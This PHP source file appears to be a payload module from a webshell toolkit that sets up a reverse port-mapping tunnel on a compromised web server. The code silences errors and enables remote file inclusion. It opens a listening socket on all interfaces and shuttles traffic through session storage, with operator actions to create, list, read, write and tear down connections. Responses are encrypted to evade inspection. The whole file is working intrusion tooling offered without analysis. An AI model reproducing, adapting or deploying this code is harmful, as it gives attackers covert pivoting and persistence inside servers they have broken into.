@error_reporting(0);
@set_time_limit(0);
function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
{
    $result = array();
    ini_set("allow_url_fopen", true);
    ini_set("allow_url_include", true);
    if (function_exists('dl')) {
        dl("php_sockets.dll");
    }
    switch ($action) {
        case "create":
            $serverSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            socket_set_option($serverSocket, SOL_SOCKET, SO_REUSEPORT, 1);
            $bind = socket_bind($serverSocket, "0.0.0.0", $listenPort);
            if (!$bind) {
                $result["status"] = base64_encode("fail");
                $result["msg"] = base64_encode(socket_strerror($serverSocket));
                echo encrypt(json_encode($result), $_SESSION['k']);
                return;
            }

            $listen = socket_listen($serverSocket);
            if (!$listen) {
                $result["status"] = base64_encode("fail");
                $result["msg"] = base64_encode(socket_strerror($listen));
                echo encrypt(json_encode($result), $_SESSION['k']);
                return;
            }
            socket_set_nonblock($serverSocket);
            $serverSocketHash = "reverseportmap_server_" . $listenPort;
            @session_start();
            $_SESSION[$serverSocketHash] = $serverSocket;
            $_SESSION["running".$listenPort] = true;
            session_write_close();


            /*ob_end_clean();
            header("Connection: close");
            ignore_user_abort();
            ob_start();
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode("success");
            echo encrypt(json_encode($result), $_SESSION['k']);
            $size = ob_get_length();
            header("Content-Length: $size");
            ob_end_flush();
            flush();*/

            $clients = array();
            $read=array();
            $write = array();
            $exp = array();
            while ($_SESSION["running".$listenPort]) {

                $serverInnerSocket = socket_accept($serverSocket);
                if ($serverInnerSocket !== false) {
                    socket_getpeername($serverInnerSocket, $address, $port);
                    $serverInnersocketHash = "reverseportmap_socket_" . $listenPort . "_" . $address . "_" . $port;
                     @session_start();
                                            $_SESSION[$serverInnersocketHash]="socket";
                                            session_write_close();

                    socket_set_nonblock($serverInnerSocket);
                    $clients[] = $serverInnerSocket;
                }
                $read = $clients;

                $write = $clients;

                if (socket_select($read, $write, $exp, null) > 0) {
                    foreach ($read as $socket_item) {
                        socket_getpeername($socket_item, $address, $port);
                        $serverInnersocketReadHash = "reverseportmap_socket_" . $listenPort . "_" . $address . "_" . $port . "_read";
                        $readContent = "";
                        $content = socket_read($socket_item, 2048);
                        while(strlen($content)>0)
                        {
                            $readContent=$readContent.$content;
                            $content = socket_read($socket_item, 2048);
                        }
                        @session_start();
                        $_SESSION[$serverInnersocketReadHash]=$_SESSION[$serverInnersocketReadHash].$readContent;
                        session_write_close();
                    }
                    foreach ($write as $socket_item) {
                        socket_getpeername($socket_item, $address, $port);
                        $serverInnersocketWriteHash = "reverseportmap_socket_" . $listenPort . "_" . $address . "_" . $port . "_write";
                        @session_start();
                        $writeContent=$_SESSION[$serverInnersocketWriteHash];
                        if (strlen($writeContent)>0)
                        {
                        $count=socket_write($socket_item, $writeContent, strlen($writeContent));
                        }
                        $_SESSION[$serverInnersocketWriteHash]="";
                        session_write_close();


                    }
                }
            }
            break;
        case "list":
            $socketList = array();
             @session_start();
            foreach ($_SESSION as $key => $val) {
                if (strstr($key, "reverseportmap")) {
                    if ($_SESSION[$key]!="socket")
                    {
                      continue;
                    }
                    $socketObj = array(
                        "socketHash" => $key
                    );
                    array_push($socketList, $socketObj);
                }
            }
             session_write_close();
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode(json_encode($socketList));
            echo encrypt(json_encode($result), $_SESSION['k']);
            return;
        case "read":
            $socketReadHash=$socketHash."_read";
            @session_start();
            if (isset($_SESSION[$socketReadHash])) {
                $readContent=$_SESSION[$socketReadHash];
                $_SESSION[$socketReadHash]="";
                session_write_close();
                echo $readContent;
                return;
            } else {
                //echo "\x37\x21\x49\x36RemoteSocket read failed";
                return;
            }
        case "write":
            $socketWriteHash=$socketHash."_write";
            $rawPostData = base64_decode($extraData);
            if ($rawPostData) {
                @session_start();
                $_SESSION[$socketWriteHash]=$_SESSION[$socketWriteHash].$rawPostData;
                session_write_close();
                header("Connection: Keep-Alive");
            } else {
                echo "\x37\x21\x49\x36RemoteSocket write failed";
            }
            return;
        case "stop":
            $socketHashList = array();
            @session_start();
            foreach ($_SESSION as $key => $val) {
                if (strstr($key, "reverseportmap_socket_" . $listenPort)) {
                    $socketHashList[] = $key;
                }
            }
            session_write_close();
            foreach ($socketHashList as $key) {
                @session_start();
                unset($_SESSION[$key]);
                session_write_close();
            }
            $serverSocketHash = "reverseportmap_server_" . $listenPort;
            @session_start();
            unset($_SESSION[$serverSocketHash]);
             $_SESSION["running".$listenPort] = false;
             session_write_close();
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode("服务侧Socket资源已释放。");
            echo encrypt(json_encode($result), $_SESSION['k']);
            return;
        case "close":
            socket_close($_SESSION[$socketHash]);
            unset($_SESSION[$socketHash]);
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode("服务侧Socket资源已释放。");
            echo encrypt(json_encode($result), $_SESSION['k']);
            return;
        default: {
            }
    }
}
function encrypt($data, $key)
{
    if (!extension_loaded('openssl')) {
        for ($i = 0; $i < strlen($data); $i++) {
            $data[$i] = $data[$i] ^ $key[$i + 1 & 15];
        }
        return $data;
    } else {
        return openssl_encrypt($data, "AES128", $key);
    }
}
